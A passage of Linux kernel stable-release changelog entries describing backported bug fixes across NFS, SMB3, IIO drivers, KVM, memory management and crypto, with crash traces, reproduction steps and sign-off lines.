that are sane w.r.t. the server's preferred r/wsizes) but would only check
values set by the user in the 'mount' command.
The code was changed in 4.11 to \_always\_ set the r/wsize, meaning that we
now never use the server preferred r/wsizes. This is the regression that
this patch fixes.
Also rename the function to nfs4\_session\_limit\_rwsize() in order to avoid
future confusion.
Fixes: 033853325fe3 (NFSv4.1 respect server's max size in CREATE\_SESSION")
Cc: stable@vger.kernel.org # v4.11+
Signed-off-by: Trond Myklebust
Signed-off-by: Greg Kroah-Hartman
commit d9e1cdc8b0ff6083103ef3c02e2b5163f52cc061
Author: Johan Hovold
Date: Mon Aug 27 10:21:52 2018 +0200
NFC: nfcmrvl\_uart: fix OF child-node lookup
commit 5bf59773aaf36dd62117dc83d50e1bbf9ef432da upstream.
Use the new of\_get\_compatible\_child() helper to lookup the nfc child
node instead of using of\_find\_compatible\_node(), which searches the
entire tree from a given start node and thus can return an unrelated
(i.e. non-child) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the parent node).
Fixes: e097dc624f78 ("NFC: nfcmrvl: add UART driver")
Fixes: d8e018c0b321 ("NFC: nfcmrvl: update device tree bindings for Marvell NFC")
Cc: stable  # 4.2
Cc: Vincent Cuissard
Cc: Samuel Ortiz
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit c6d2e2023c2c0dd91cf8ba18fe2fa888aceb0f88
Author: Jarkko Sakkinen
Date: Mon Sep 3 04:01:26 2018 +0300
tpm: fix response size validation in tpm\_get\_random()
commit 84b59f6487d82d3ab4247a099aba66d4d17e8b08 upstream.
When checking whether the response is large enough to be able to contain
the received random bytes in tpm\_get\_random() and tpm2\_get\_random(),
they fail to take account the header size, which should be added to the
minimum size. This commit fixes this issue.
Cc: stable@vger.kernel.org
Fixes: c659af78eb7b ("tpm: Check size of response before accessing data")
Signed-off-by: Jarkko Sakkinen
Signed-off-by: Greg Kroah-Hartman
commit e6d2f788cb714c1675645813feee23306ad39e73
Author: Lukas Wunner
Date: Thu Oct 18 15:15:05 2018 +0200
genirq: Fix race on spurious interrupt detection
commit 746a923b863a1065ef77324e1e43f19b1a3eab5c upstream.
Commit 1e77d0a1ed74 ("genirq: Sanitize spurious interrupt detection of
threaded irqs") made detection of spurious interrupts work for threaded
handlers by:
a) incrementing a counter every time the thread returns IRQ\_HANDLED, and
b) checking whether that counter has increased every time the thread is
woken.
However for oneshot interrupts, the commit unmasks the interrupt before
incrementing the counter. If another interrupt occurs right after
unmasking but before the counter is incremented, that interrupt is
incorrectly considered spurious:
time
| irq\_thread()
| irq\_thread\_fn()
| action->thread\_fn()
| irq\_finalize\_oneshot()
| unmask\_threaded\_irq() /\* interrupt is unmasked \*/
|
| /\* interrupt fires, incorrectly deemed spurious \*/
|
| atomic\_inc(&desc->threads\_handled); /\* counter is incremented \*/
v
This is observed with a hi3110 CAN controller receiving data at high volume
(from a separate machine sending with "cangen -g 0 -i -x"): The controller
signals a huge number of interrupts (hundreds of millions per day) and
every second there are about a dozen which are deemed spurious.
In theory with high CPU load and the presence of higher priority tasks, the
number of incorrectly detected spurious interrupts might increase beyond
the 99,900 threshold and cause disablement of the interrupt.
In practice it just increments the spurious interrupt count. But that can
cause people to waste time investigating it over and over.
Fix it by moving the accounting before the invocation of
irq\_finalize\_oneshot().
[ tglx: Folded change log update ]
Fixes: 1e77d0a1ed74 ("genirq: Sanitize spurious interrupt detection of threaded irqs")
Signed-off-by: Lukas Wunner
Signed-off-by: Thomas Gleixner
Cc: Mathias Duckeck
Cc: Akshay Bhat
Cc: Casey Fitzpatrick
Cc: stable@vger.kernel.org # v3.16+
Link: https://lkml.kernel.org/r/1dfd8bbd16163940648045495e3e9698e63b50ad.1539867047.git.lukas@wunner.de
Signed-off-by: Greg Kroah-Hartman
commit e945325eb75fa9f27727a3598dd41e2273ddf1a1
Author: He Zhe
Date: Sun Sep 30 00:45:50 2018 +0800
printk: Fix panic caused by passing log\_buf\_len to command line
commit 277fcdb2cfee38ccdbe07e705dbd4896ba0c9930 upstream.
log\_buf\_len\_setup does not check input argument before passing it to
simple\_strtoull. The argument would be a NULL pointer if "log\_buf\_len",
without its value, is set in command line and thus causes the following
panic.
PANIC: early exception 0xe3 IP 10:ffffffffaaeacd0d error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.19.0-rc4-yocto-standard+ #1
[ 0.000000] RIP: 0010:\_parse\_integer\_fixup\_radix+0xd/0x70
...
[ 0.000000] Call Trace:
[ 0.000000] simple\_strtoull+0x29/0x70
[ 0.000000] memparse+0x26/0x90
[ 0.000000] log\_buf\_len\_setup+0x17/0x22
[ 0.000000] do\_early\_param+0x57/0x8e
[ 0.000000] parse\_args+0x208/0x320
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_options+0x29/0x2d
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_param+0x36/0x4d
[ 0.000000] setup\_arch+0x336/0x99e
[ 0.000000] start\_kernel+0x6f/0x4ee
[ 0.000000] x86\_64\_start\_reservations+0x24/0x26
[ 0.000000] x86\_64\_start\_kernel+0x6f/0x72
[ 0.000000] secondary\_startup\_64+0xa4/0xb0
This patch adds a check to prevent the panic.
Link: http://lkml.kernel.org/r/1538239553-81805-1-git-send-email-zhe.he@windriver.com
Cc: stable@vger.kernel.org
Cc: rostedt@goodmis.org
Cc: linux-kernel@vger.kernel.org
Signed-off-by: He Zhe
Reviewed-by: Sergey Senozhatsky
Signed-off-by: Petr Mladek
Signed-off-by: Greg Kroah-Hartman
commit 93e2e86745480686f336d8c5ea699ca4125b49f8
Author: Steve French
Date: Sun Oct 28 13:13:23 2018 -0500
smb3: on kerberos mount if server doesn't specify auth type use krb5
commit 926674de6705f0f1dbf29a62fd758d0977f535d6 upstream.
Some servers (e.g. Azure) do not include a spnego blob in the SMB3
negotiate protocol response, so on kerberos mounts ("sec=krb5")
we can fail, as we expected the server to list its supported
auth types (OIDs in the spnego blob in the negprot response).
Change this so that on krb5 mounts we default to trying krb5 if the
server doesn't list its supported protocol mechanisms.
Signed-off-by: Steve French
Reviewed-by: Ronnie Sahlberg
CC: Stable
Signed-off-by: Greg Kroah-Hartman
commit 108b981d48f115144ab13e056cd16f828728e561
Author: Steve French
Date: Fri Oct 19 00:45:21 2018 -0500
smb3: do not attempt cifs operation in smb3 query info error path
commit 1e77a8c204c9d1b655c61751b8ad0fde22421dbb upstream.
If backupuid mount option is sent, we can incorrectly retry
(on access denied on query info) with a cifs (FindFirst) operation
on an smb3 mount which causes the server to force the session close.
We set backup intent on open so no need for this fallback.
See kernel bugzilla 201435
Signed-off-by: Steve French
CC: Stable
Reviewed-by: Ronnie Sahlberg
Signed-off-by: Greg Kroah-Hartman
commit eb7814c36f49219f71d8cae91150c3e000c1531a
Author: Steve French
Date: Sat Sep 15 23:04:41 2018 -0500
smb3: allow stats which track session and share reconnects to be reset
commit 2c887635cd6ab3af619dc2be94e5bf8f2e172b78 upstream.
Currently, "echo 0 > /proc/fs/cifs/Stats" resets all of the stats
except the session and share reconnect counts. Fix it to
reset those as well.
CC: Stable
Signed-off-by: Steve French
Reviewed-by: Aurelien Aptel
Signed-off-by: Greg Kroah-Hartman
commit b8e2aea1d4efa0ecfcfcd54c799678e581ed835b
Author: Andreas Kemnade
Date: Sat Sep 22 21:20:54 2018 +0200
w1: omap-hdq: fix missing bus unregister at removal
commit a007734618fee1bf35556c04fa498d41d42c7301 upstream.
The bus master was not removed after unloading the module
or unbinding the driver. That lead to oopses like this
[ 127.842987] Unable to handle kernel paging request at virtual address bf01d04c
[ 127.850646] pgd = 70e3cd9a
[ 127.853698] [bf01d04c] \*pgd=8f908811, \*pte=00000000, \*ppte=00000000
[ 127.860412] Internal error: Oops: 80000007 [#1] PREEMPT SMP ARM
[ 127.866668] Modules linked in: bq27xxx\_battery overlay [last unloaded: omap\_hdq]
[ 127.874542] CPU: 0 PID: 1022 Comm: w1\_bus\_master1 Not tainted 4.19.0-rc4-00001-g2d51da718324 #12
[ 127.883819] Hardware name: Generic OMAP36xx (Flattened Device Tree)
[ 127.890441] PC is at 0xbf01d04c
[ 127.893798] LR is at w1\_search\_process\_cb+0x4c/0xfc
[ 127.898956] pc : [] lr : [] psr: a0070013
[ 127.905609] sp : cf885f48 ip : bf01d04c fp : ddf1e11c
[ 127.911132] r10: cf8fe040 r9 : c05f8d00 r8 : cf8fe040
[ 127.916656] r7 : 000000f0 r6 : cf8fe02c r5 : cf8fe000 r4 : cf8fe01c
[ 127.923553] r3 : c05f8d00 r2 : 000000f0 r1 : cf8fe000 r0 : dde1ef10
[ 127.930450] Flags: NzCv IRQs on FIQs on Mode SVC\_32 ISA ARM Segment none
[ 127.938018] Control: 10c5387d Table: 8f8f0019 DAC: 00000051
[ 127.944091] Process w1\_bus\_master1 (pid: 1022, stack limit = 0x9135699f)
[ 127.951171] Stack: (0xcf885f48 to 0xcf886000)
[ 127.955810] 5f40: cf8fe000 00000000 cf884000 cf8fe090 000003e8 c05f8d00
[ 127.964477] 5f60: dde5fc34 c05f9700 ddf1e100 ddf1e540 cf884000 cf8fe000 c05f9694 00000000
[ 127.973114] 5f80: dde5fc34 c01499a4 00000000 ddf1e540 c0149874 00000000 00000000 00000000
[ 127.981781] 5fa0: 00000000 00000000 00000000 c01010e8 00000000 00000000 00000000 00000000
[ 127.990447] 5fc0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[ 127.999114] 5fe0: 00000000 00000000 00000000 00000000 00000013 00000000 00000000 00000000
[ 128.007781] [] (w1\_search\_process\_cb) from [] (w1\_process+0x6c/0x118)
[ 128.016479] [] (w1\_process) from [] (kthread+0x130/0x148)
[ 128.024047] [] (kthread) from [] (ret\_from\_fork+0x14/0x2c)
[ 128.031677] Exception stack(0xcf885fb0 to 0xcf885ff8)
[ 128.037017] 5fa0: 00000000 00000000 00000000 00000000
[ 128.045684] 5fc0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[ 128.054351] 5fe0: 00000000 00000000 00000000 00000000 00000013 00000000
[ 128.061340] Code: bad PC value
[ 128.064697] ---[ end trace af066e33c0e14119 ]---
Cc:
Signed-off-by: Andreas Kemnade
Signed-off-by: Greg Kroah-Hartman
commit cf6ab9439838cdcae65d3ad86361fca251786359
Author: Eugen Hristev
Date: Mon Sep 24 10:51:44 2018 +0300
iio: adc: at91: fix wrong channel number in triggered buffer mode
commit aea835f2dc8a682942b859179c49ad1841a6c8b9 upstream.
When channels are registered, the hardware channel number is not the
actual iio channel number.
This is because the driver is probed with a certain number of accessible
channels. Some pins are routed and some not, depending on the description of
the board in the DT.
Because of that, channels 0,1,2,3 can correspond to hardware channels
2,3,4,5 for example.
In the buffered triggered case, we need to do the translation accordingly.
Fixed the channel number to stop reading the wrong channel.
Fixes: 0e589d5fb ("ARM: AT91: IIO: Add AT91 ADC driver.")
Cc: Maxime Ripard
Signed-off-by: Eugen Hristev
Acked-by: Ludovic Desroches
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit b7e95f41121dcff8d2d61fe31d793b333c82b8a5
Author: Eugen Hristev
Date: Mon Sep 24 10:51:43 2018 +0300
iio: adc: at91: fix acking DRDY irq on simple conversions
commit bc1b45326223e7e890053cf6266357adfa61942d upstream.
When doing simple conversions, the driver did not acknowledge the DRDY irq.
If this irq status is not acked, it will be left pending, and as soon as a
trigger is enabled, the irq handler will be called, it doesn't know why
this status has occurred because no channel is pending, and then it will go
int a irq loop and board will hang.
To avoid this situation, read the LCDR after a raw conversion is done.
Fixes: 0e589d5fb ("ARM: AT91: IIO: Add AT91 ADC driver.")
Cc: Maxime Ripard
Signed-off-by: Eugen Hristev
Acked-by: Ludovic Desroches
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit f809deba3e5771b177695edc572232969744c226
Author: Alexey Khoroshilov
Date: Sat Sep 22 00:58:02 2018 +0300
iio: adc: imx25-gcq: Fix leak of device\_node in mx25\_gcq\_setup\_cfgs()
commit d3fa21c73c391975488818b085b894c2980ea052 upstream.
Leaving for\_each\_child\_of\_node loop we should release child device node,
if it is not stored for future use.
Found by Linux Driver Verification project (linuxtesting.org).
JC: I'm not sending this as a quick fix as it's been wrong for years,
but good to pick up for stable after the merge window.
Signed-off-by: Alexey Khoroshilov
Fixes: 6df2e98c3ea56 ("iio: adc: Add imx25-gcq ADC driver")
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit 57629351f0a627101ac85419bb7b25c4af743809
Author: Lars-Peter Clausen
Date: Fri Sep 28 11:23:40 2018 +0200
iio: ad5064: Fix regulator handling
commit 8911a43bc198877fad9f4b0246a866b26bb547ab upstream.
The correct way to handle errors returned by regualtor\_get() and friends is
to propagate the error since that means that an regulator was specified,
but something went wrong when requesting it.
For handling optional regulators, e.g. when the device has an internal
vref, regulator\_get\_optional() should be used to avoid getting the dummy
regulator that the regulator core otherwise provides.
Signed-off-by: Lars-Peter Clausen
Cc:
Signed-off-by: Jonathan Cameron
Signed-off-by: Greg Kroah-Hartman
commit 1e36467f654e694c4c3421fa437a3bd28088adca
Author: Arnd Bergmann
Date: Tue Oct 30 15:07:32 2018 -0700
kbuild: fix kernel/bounds.c 'W=1' warning
commit 6a32c2469c3fbfee8f25bcd20af647326650a6cf upstream.
Building any configuration with 'make W=1' produces a warning:
kernel/bounds.c:16:6: warning: no previous prototype for 'foo' [-Wmissing-prototypes]
When also passing -Werror, this prevents us from building any other files.
Nobody ever calls the function, but we can't make it 'static' either
since we want the compiler output.
Calling it 'main' instead however avoids the warning, because gcc
does not insist on having a declaration for main.
Link: http://lkml.kernel.org/r/20181005083313.2088252-1-arnd@arndb.de
Signed-off-by: Arnd Bergmann
Reported-by: Kieran Bingham
Reviewed-by: Kieran Bingham
Cc: David Laight
Cc: Masahiro Yamada
Cc: Greg Kroah-Hartman
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 59571785018d22893eaaf266ecae9aa9c12343c4
Author: Mark Rutland
Date: Wed Oct 17 17:42:10 2018 +0100
KVM: arm64: Fix caching of host MDCR\_EL2 value
commit da5a3ce66b8bb51b0ea8a89f42aac153903f90fb upstream.
At boot time, KVM stashes the host MDCR\_EL2 value, but only does this
when the kernel is not running in hyp mode (i.e. is non-VHE). In these
cases, the stashed value of MDCR\_EL2.HPMN happens to be zero, which can
lead to CONSTRAINED UNPREDICTABLE behaviour.
Since we use this value to derive the MDCR\_EL2 value when switching
to/from a guest, after a guest have been run, the performance counters
do not behave as expected. This has been observed to result in accesses
via PMXEVTYPER\_EL0 and PMXEVCNTR\_EL0 not affecting the relevant
counters, resulting in events not being counted. In these cases, only
the fixed-purpose cycle counter appears to work as expected.
Fix this by always stashing the host MDCR\_EL2 value, regardless of VHE.
Cc: Christopher Dall
Cc: James Morse
Cc: Will Deacon
Cc: stable@vger.kernel.org
Fixes: 1e947bad0b63b351 ("arm64: KVM: Skip HYP setup when already running in HYP")
Tested-by: Robin Murphy
Signed-off-by: Mark Rutland
Signed-off-by: Marc Zyngier
Signed-off-by: Greg Kroah-Hartman
commit 3e286d39ccd799e271c215b2e6633f19d34d910b
Author: Punit Agrawal
Date: Mon Oct 1 16:54:35 2018 +0100
KVM: arm/arm64: Ensure only THP is candidate for adjustment
commit fd2ef358282c849c193aa36dadbf4f07f7dcd29b upstream.
PageTransCompoundMap() returns true for hugetlbfs and THP
hugepages. This behaviour incorrectly leads to stage 2 faults for
unsupported hugepage sizes (e.g., 64K hugepage with 4K pages) to be
treated as THP faults.
Tighten the check to filter out hugetlbfs pages. This also leads to
consistently mapping all unsupported hugepage sizes as PTE level
entries at stage 2.
Signed-off-by: Punit Agrawal
Reviewed-by: Suzuki Poulose
Cc: Christoffer Dall
Cc: Marc Zyngier
Cc: stable@vger.kernel.org # v4.13+
Signed-off-by: Marc Zyngier
Signed-off-by: Greg Kroah-Hartman
commit daca89ecdb72c686127155b61857937fe43cd847
Author: Ralph Campbell
Date: Tue Oct 30 15:04:14 2018 -0700
mm/hmm: fix race between hmm\_mirror\_unregister() and mmu\_notifier callback
commit 86a2d59841ab0b147ffc1b7b3041af87927cf312 upstream.
In hmm\_mirror\_unregister(), mm->hmm is set to NULL and then
mmu\_notifier\_unregister\_no\_release() is called. That creates a small
window where mmu\_notifier can call mmu\_notifier\_ops with mm->hmm equal to
NULL. Fix this by first unregistering mmu notifier callbacks and then
setting mm->hmm to NULL.
Similarly in hmm\_register(), set mm->hmm before registering mmu\_notifier
callbacks so callback functions always see mm->hmm set.
Link: http://lkml.kernel.org/r/20181019160442.18723-4-jglisse@redhat.com
Signed-off-by: Ralph Campbell
Signed-off-by: Jérôme Glisse
Reviewed-by: John Hubbard
Reviewed-by: Jérôme Glisse
Reviewed-by: Balbir Singh
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit f968acd737c108c308425276bbda43a9ded0211e
Author: Ralph Campbell
Date: Tue Oct 30 15:04:11 2018 -0700
mm/rmap: map\_pte() was not handling private ZONE\_DEVICE page properly
commit aab8d0520e6e7c2a61f71195e6ce7007a4843afb upstream.
Private ZONE\_DEVICE pages use a special pte entry and thus are not
present. Properly handle this case in map\_pte(), it is already handled in
check\_pte(), the map\_pte() part was lost in some rebase most probably.
Without this patch the slow migration path can not migrate back to any
private ZONE\_DEVICE memory to regular memory. This was found after stress
testing migration back to system memory. This ultimatly can lead to the
CPU constantly page fault looping on the special swap entry.
Link: http://lkml.kernel.org/r/20181019160442.18723-3-jglisse@redhat.com
Signed-off-by: Ralph Campbell
Signed-off-by: Jérôme Glisse
Reviewed-by: Balbir Singh
Cc: Andrew Morton
Cc: Kirill A. Shutemov
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit fa5466d73cae9f663f9d8ebdb16d567e2354e82b
Author: Mike Kravetz
Date: Fri Oct 26 15:10:58 2018 -0700
hugetlbfs: dirty pages as they are added to pagecache
commit 22146c3ce98962436e401f7b7016a6f664c9ffb5 upstream.
Some test systems were experiencing negative huge page reserve counts and
incorrect file block counts. This was traced to /proc/sys/vm/drop\_caches
removing clean pages from hugetlbfs file pagecaches. When non-hugetlbfs
explicit code removes the pages, the appropriate accounting is not
performed.
This can be recreated as follows:
fallocate -l 2M /dev/hugepages/foo
echo 1 > /proc/sys/vm/drop\_caches
fallocate -l 2M /dev/hugepages/foo
grep -i huge /proc/meminfo
AnonHugePages: 0 kB
ShmemHugePages: 0 kB
HugePages\_Total: 2048
HugePages\_Free: 2047
HugePages\_Rsvd: 18446744073709551615
HugePages\_Surp: 0
Hugepagesize: 2048 kB
Hugetlb: 4194304 kB
ls -lsh /dev/hugepages/foo
4.0M -rw-r--r--. 1 root root 2.0M Oct 17 20:05 /dev/hugepages/foo
To address this issue, dirty pages as they are added to pagecache. This
can easily be reproduced with fallocate as shown above. Read faulted
pages will eventually end up being marked dirty. But there is a window
where they are clean and could be impacted by code such as drop\_caches.
So, just dirty them all as they are added to the pagecache.
Link: http://lkml.kernel.org/r/b5be45b8-5afe-56cd-9482-28384699a049@oracle.com
Fixes: 6bda666a03f0 ("hugepages: fold find\_or\_alloc\_pages into huge\_no\_page()")
Signed-off-by: Mike Kravetz
Acked-by: Mihcla Hocko
Reviewed-by: Khalid Aziz
Cc: Hugh Dickins
Cc: Naoya Horiguchi
Cc: "Aneesh Kumar K . V"
Cc: Andrea Arcangeli
Cc: "Kirill A . Shutemov"
Cc: Davidlohr Bueso
Cc: Alexander Viro
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 8b259b99654cbd19b5958061ed6190dc514d6286
Author: Goldwyn Rodrigues
Date: Tue Oct 9 10:12:33 2018 -0500
ima: open a new file instance if no read permissions
commit a408e4a86b36bf98ad15b9ada531cf0e5118ac67 upstream.
Open a new file instance as opposed to changing file->f\_mode when
the file is not readable. This is done to accomodate overlayfs
stacked file operations change. The real struct file is hidden
behind the overlays struct file. So, any file->f\_mode manipulations are
not reflected on the real struct file. Open the file again in read mode
if original file cannot be read, read and calculate the hash.
Signed-off-by: Goldwyn Rodrigues
Cc: stable@vger.kernel.org (linux-4.19)
Signed-off-by: Mimi Zohar
Signed-off-by: Greg Kroah-Hartman
commit 13d3c98fa8037ecd5c8d4ed165150fad95f59e6f
Author: Eric Biggers
Date: Fri Sep 7 14:33:24 2018 -0700
ima: fix showing large 'violations' or 'runtime\_measurements\_count'
commit 1e4c8dafbb6bf72fb5eca035b861e39c5896c2b7 upstream.
The 12 character temporary buffer is not necessarily long enough to hold
a 'long' value. Increase it.
Signed-off-by: Eric Biggers
Cc: stable@vger.kernel.org
Signed-off-by: Mimi Zohar
Signed-off-by: Greg Kroah-Hartman
commit d2e97f026b1b8948a9782c4c42a87a51da455a55
Author: Christoph Hellwig
Date: Fri Oct 26 15:02:19 2018 -0700
userfaultfd: disable irqs when taking the waitqueue lock
commit ae62c16e105a869524afcf8a07ee85c5ae5d0479 upstream.
userfaultfd contains howe-grown locking of the waitqueue lock, and does
not disable interrupts. This relies on the fact that no one else takes it
from interrupt context and violates an invariat of the normal waitqueue
locking scheme. With aio poll it is easy to trigger other locks that
disable interrupts (or are called from interrupt context).
Link: http://lkml.kernel.org/r/20181018154101.18750-1-hch@lst.de
Signed-off-by: Christoph Hellwig
Reviewed-by: Andrea Arcangeli
Reviewed-by: Andrew Morton
Cc:  [4.19.x]
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 30391e41deef661849d6c2d345a8c87eb4fdcf5a
Author: Vlastimil Babka
Date: Fri Oct 26 15:02:16 2018 -0700
mm: /proc/pid/smaps\_rollup: fix NULL pointer deref in smaps\_pte\_range()
commit fa76da461bb0be13c8339d984dcf179151167c8f upstream.
Leonardo reports an apparent regression in 4.19-rc7:
BUG: unable to handle kernel NULL pointer dereference at 00000000000000f0
PGD 0 P4D 0
Oops: 0000 [#1] PREEMPT SMP PTI
CPU: 3 PID: 6032 Comm: python Not tainted 4.19.0-041900rc7-lowlatency #201810071631
Hardware name: LENOVO 80UG/Toronto 4A2, BIOS 0XCN45WW 08/09/2018
RIP: 0010:smaps\_pte\_range+0x32d/0x540
Code: 80 00 00 00 00 74 a9 48 89 de 41 f6 40 52 40 0f 85 04 02 00 00 49 2b 30 48 c1 ee 0c 49 03 b0 98 00 00 00 49 8b 80 a0 00 00 00 <48> 8b b8 f0 00 00 00 e8 b7 ef ec ff 48 85 c0 0f 84 71 ff ff ff a8
RSP: 0018:ffffb0cbc484fb88 EFLAGS: 00010202
RAX: 0000000000000000 RBX: 0000560ddb9e9000 RCX: 0000000000000000
RDX: 0000000000000000 RSI: 0000000560ddb9e9 RDI: 0000000000000001
RBP: ffffb0cbc484fbc0 R08: ffff94a5a227a578 R09: ffff94a5a227a578
R10: 0000000000000000 R11: 0000560ddbbe7000 R12: ffffe903098ba728
R13: ffffb0cbc484fc78 R14: ffffb0cbc484fcf8 R15: ffff94a5a2e9cf48
FS: 00007f6dfb683740(0000) GS:ffff94a5aaf80000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000000000f0 CR3: 000000011c118001 CR4: 00000000003606e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
\_\_walk\_page\_range+0x3c2/0x6f0
walk\_page\_vma+0x42/0x60
smap\_gather\_stats+0x79/0xe0
? gather\_pte\_stats+0x320/0x320
? gather\_hugetlb\_stats+0x70/0x70
show\_smaps\_rollup+0xcd/0x1c0
seq\_read+0x157/0x400
\_\_vfs\_read+0x3a/0x180
? security\_file\_permission+0x93/0xc0
? security\_file\_permission+0x93/0xc0
vfs\_read+0x8f/0x140
ksys\_read+0x55/0xc0
\_\_x64\_sys\_read+0x1a/0x20
do\_syscall\_64+0x5a/0x110
entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
Decoded code matched to local compilation+disassembly points to
smaps\_pte\_entry():
} else if (unlikely(IS\_ENABLED(CONFIG\_SHMEM) && mss->check\_shmem\_swap
&& pte\_none(\*pte))) {
page = find\_get\_entry(vma->vm\_file->f\_mapping,
linear\_page\_index(vma, addr));
Here, vma->vm\_file is NULL. mss->check\_shmem\_swap should be false in that
case, however for smaps\_rollup, smap\_gather\_stats() can set the flag true
for one vma and leave it true for subsequent vma's where it should be
false.
To fix, reset the check\_shmem\_swap flag to false. There's also related
bug which sets mss->swap to shmem\_swapped, which in the context of
smaps\_rollup overwrites any value accumulated from previous vma's. Fix
that as well.
Note that the report suggests a regression between 4.17.19 and 4.19-rc7,
which makes the 4.19 series ending with commit 258f669e7e88 ("mm:
/proc/pid/smaps\_rollup: convert to single value seq\_file") suspicious.
But the mss was reused for rollup since 493b0e9d945f ("mm: add
/proc/pid/smaps\_rollup") so let's play it safe with the stable backport.
Link: http://lkml.kernel.org/r/555fbd1f-4ac9-0b58-dcd4-5dc4380ff7ca@suse.cz
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=201377
Fixes: 493b0e9d945f ("mm: add /proc/pid/smaps\_rollup")
Signed-off-by: Vlastimil Babka
Reported-by: Leonardo Soares Müller
Tested-by: Leonardo Soares Müller
Cc: Greg Kroah-Hartman
Cc: Daniel Colascione
Cc: Alexey Dobriyan
Cc:
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 3252b60cf810aec6460f4777a7730bfc70448729
Author: Jason A. Donenfeld
Date: Tue Aug 7 08:22:25 2018 +0200
crypto: speck - remove Speck
commit 578bdaabd015b9b164842c3e8ace9802f38e7ecc upstream.
These are unused, undesired, and have never actually been used by
anybody. The original authors of this code have changed their mind about
its inclusion. While originally proposed for disk encryption on low-end
devices, the idea was discarded [1] in favor of something else before
that could really get going. Therefore, this patch removes Speck.
[1] https://marc.info/?l=linux-crypto-vger&m=153359499015659
Signed-off-by: Jason A. Donenfeld
Acked-by: Eric Biggers
Cc: stable@vger.kernel.org
Acked-by: Ard Biesheuvel
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 4f1f95224687bf80a553fbaeac591cbd49e44db2
Author: Ard Biesheuvel
Date: Mon Oct 1 10:36:38 2018 +0200
crypto: aegis/generic - fix for big endian systems
commit 4a34e3c2f2f48f47213702a84a123af0fe21ad60 upstream.
Use the correct \_\_le32 annotation and accessors to perform the
single round of AES encryption performed inside the AEGIS transform.
Otherwise, tcrypt reports:
alg: aead: Test 1 failed on encryption for aegis128-generic
00000000: 6c 25 25 4a 3c 10 1d 27 2b c1 d4 84 9a ef 7f 6e
alg: aead: Test 1 failed on encryption for aegis128l-generic
00000000: cd c6 e3 b8 a0 70 9d 8e c2 4f 6f fe 71 42 df 28
alg: aead: Test 1 failed on encryption for aegis256-generic
00000000: aa ed 07 b1 96 1d e9 e6 f2 ed b5 8e 1c 5f dc 1c
Fixes: f606a88e5823 ("crypto: aegis - Add generic AEGIS AEAD implementations")
Cc:  # v4.18+
Signed-off-by: Ard Biesheuvel
Reviewed-by: Ondrej Mosnacek
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 964f374b3ba7282c6703bbf05ec4d7d50fbe0c72
Author: Ard Biesheuvel
Date: Mon Oct 1 10:36:37 2018 +0200
crypto: morus/generic - fix for big endian systems
commit 5a8dedfa3276e88c5865f265195d63d72aec3e72 upstream.
Omit the endian swabbing when folding the lengths of the assoc and
crypt input buffers into the state to finalize the tag. This is not
necessary given that the memory representation of the state is in
machine native endianness already.
This fixes an error reported by tcrypt running on a big endian system:
alg: aead: Test 2 failed on encryption for morus640-generic
00000000: a8 30 ef fb e6 26 eb 23 b0 87 dd 98 57 f3 e1 4b
00000010: 21
alg: aead: Test 2 failed on encryption for morus1280-generic
00000000: 88 19 1b fb 1c 29 49 0e ee 82 2f cb 97 a6 a5 ee
00000010: 5f
Fixes: 396be41f16fd ("crypto: morus - Add generic MORUS AEAD implementations")
Cc:  # v4.18+
Reviewed-by: Ondrej Mosnacek
Signed-off-by: Ard Biesheuvel
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 0b5fdbbe55754da5899431057109a26ac148700d
Author: Mikulas Patocka
Date: Wed Sep 5 09:18:43 2018 -0400
crypto: aesni - don't use GFP\_ATOMIC allocation if the request doesn't cross a page in gcm
commit a788848116454d753b13a4888e0e31ada3c4d393 upstream.
This patch fixes gcmaes\_crypt\_by\_sg so that it won't use memory
allocation if the data doesn't cross a page boundary.
Authenticated encryption may be used by dm-crypt. If the encryption or
decryption fails, it would result in I/O error and filesystem corruption.
The function gcmaes\_crypt\_by\_sg is using GFP\_ATOMIC allocation that can
fail anytime. This patch fixes the logic so that it won't attempt the
failing allocation if the data doesn't cross a page boundary.
Signed-off-by: Mikulas Patocka
Cc: stable@vger.kernel.org
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 94c7bb6598567a663835efdbf8377ee4fbe9426d
Author: Horia Geantă
Date: Wed Sep 12 16:20:48 2018 +0300
crypto: tcrypt - fix ghash-generic speed test
commit 331351f89c36bf7d03561a28b6f64fa10a9f6f3a upstream.
ghash is a keyed hash algorithm, thus setkey needs to be called.
Otherwise the following error occurs:
$ modprobe tcrypt mode=318 sec=1
